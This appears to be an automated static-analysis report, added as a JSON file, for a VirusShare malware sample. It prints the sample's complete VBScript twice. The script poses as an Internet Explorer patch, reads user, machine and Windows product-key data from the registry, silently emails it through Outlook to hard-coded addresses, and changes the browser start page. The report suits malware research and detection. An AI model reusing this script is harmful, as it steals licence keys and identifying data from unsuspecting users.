@@ -1,0 +1,79 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "RegRead": "May read registry keys",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "On Error Resume Next\nSet f=CreateObject(\"Scripting.FileSystemObject\")\nSet w=CreateObject(\"WScript.Shell\")\nSet ws=Wscript.CreateObject(\"WScript.Shell\")\nstartup=ws.SpecialFolders(\"Startup\")\nIf f.FileExists (startup&\"\\Loft.htm\") Then\nf.DeleteFile (startup&\"\\Loft.htm\")\nMsgBox \"Patch for Internet Explorer installed\",vbinformation,\"Patch v1.0\"\nMsgBox \"You can delete this file\",vbinformation,\"Patch v1.0\"\nEnd If\n\nCN=CreateObject(\"WScript.NetWork\").ComputerName\nUN=CreateObject(\"WScript.NetWork\").UserName\nUD=CreateObject(\"WScript.NetWork\").UserDomain\nNOM=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\")\nENT=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization\")\nPI=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductId\")\nPK=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductKey\")\nV=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Version\")\nVN=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\VersionNumber\")\nP=w.RegRead(\"HKCU\\Software\\Microsoft\\Internet Explorer\\International\\AcceptLanguage\")\n\nSet O=CreateObject(\"Outlook.Application\")\nSet m=O.CreateItem(0)\nm.To = \"loftptk@multimania.com\"\nm.BCC = \"petik@multimania.com; euphoria@ctw.net\"\nm.Subject=\"Loft Info arrivant de \" & P\nn = \"Date : \" & date\nn = n & VbCrLf & \"Heure : \" & time\nn = n & VbCrLf & \"Nom d'enregistrement : \" & NOM\nn = n & VbCrLf & \"Nom de l'organization : \" & ENT\nn = n & VbCrLf & \"Num\ufffdro d'identification : \" & PI\nn = n & VbCrLf & \"Num\ufffdro d'enregistrement : \" & PK\nn = n & VbCrLf & \"Version de Windows : \" & V & \" \" & VN\nn = n & VbCrLf & \"Nom de l'ordinateur : \" & CN\nn = n & VbCrLf & \"Nom de domaine : \" & UD\nn = n & VbCrLf & \"Nom d'utilisateur : \" & UN\nm.Body = n\nm.DeleteAfterSubmit=True\nm.Send\n\nw.RegWrite \"HKCU\\Software\\Microsoft\\PetiK\\LoftInfo\",\"OK\"\nw.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\",\"http://www.yahoo.fr\""
+    },
+    "filename": "VirusShare_3338ff69f06129d725329143821e2fd4",
+    "filesize": 1963,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3338ff69f06129d725329143821e2fd4",
+        "sha1": "8ca58154d669c6f66fc625601a6138300b3dc922",
+        "sha256": "6c802ba8c30337a693836ea198f7bc6627aba75382797ad480ae892d62b5c44b"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Set f=CreateObject(\"Scripting.FileSystemObject\")",
+            "Set w=CreateObject(\"WScript.Shell\")",
+            "Set ws=Wscript.CreateObject(\"WScript.Shell\")",
+            "startup=ws.SpecialFolders(\"Startup\")",
+            "If f.FileExists (startup&\"\\Loft.htm\") Then",
+            "f.DeleteFile (startup&\"\\Loft.htm\")",
+            "MsgBox \"Patch for Internet Explorer installed\",vbinformation,\"Patch v1.0\"",
+            "MsgBox \"You can delete this file\",vbinformation,\"Patch v1.0\"",
+            "End If",
+            "CN=CreateObject(\"WScript.NetWork\").ComputerName",
+            "UN=CreateObject(\"WScript.NetWork\").UserName",
+            "UD=CreateObject(\"WScript.NetWork\").UserDomain",
+            "NOM=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\")",
+            "ENT=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization\")",
+            "PI=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductId\")",
+            "PK=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductKey\")",
+            "V=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Version\")",
+            "VN=w.RegRead(\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\VersionNumber\")",
+            "P=w.RegRead(\"HKCU\\Software\\Microsoft\\Internet Explorer\\International\\AcceptLanguage\")",
+            "Set O=CreateObject(\"Outlook.Application\")",
+            "Set m=O.CreateItem(0)",
+            "m.To = \"loftptk@multimania.com\"",
+            "m.BCC = \"petik@multimania.com; euphoria@ctw.net\"",
+            "m.Subject=\"Loft Info arrivant de \" & P",
+            "n = \"Date : \" & date",
+            "n = n & VbCrLf & \"Heure : \" & time",
+            "n = n & VbCrLf & \"Nom d'enregistrement : \" & NOM",
+            "n = n & VbCrLf & \"Nom de l'organization : \" & ENT",
+            "n = n & VbCrLf & \"Numro d'identification : \" & PI",
+            "n = n & VbCrLf & \"Numro d'enregistrement : \" & PK",
+            "n = n & VbCrLf & \"Version de Windows : \" & V & \" \" & VN",
+            "n = n & VbCrLf & \"Nom de l'ordinateur : \" & CN",
+            "n = n & VbCrLf & \"Nom de domaine : \" & UD",
+            "n = n & VbCrLf & \"Nom d'utilisateur : \" & UN",
+            "m.Body = n",
+            "m.DeleteAfterSubmit=True",
+            "m.Send",
+            "w.RegWrite \"HKCU\\Software\\Microsoft\\PetiK\\LoftInfo\",\"OK\"",
+            "w.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\",\"http://www.yahoo.fr\""
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.yahoo.fr"
+        ]
+    },
+    "time": "0:00:00.283609",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
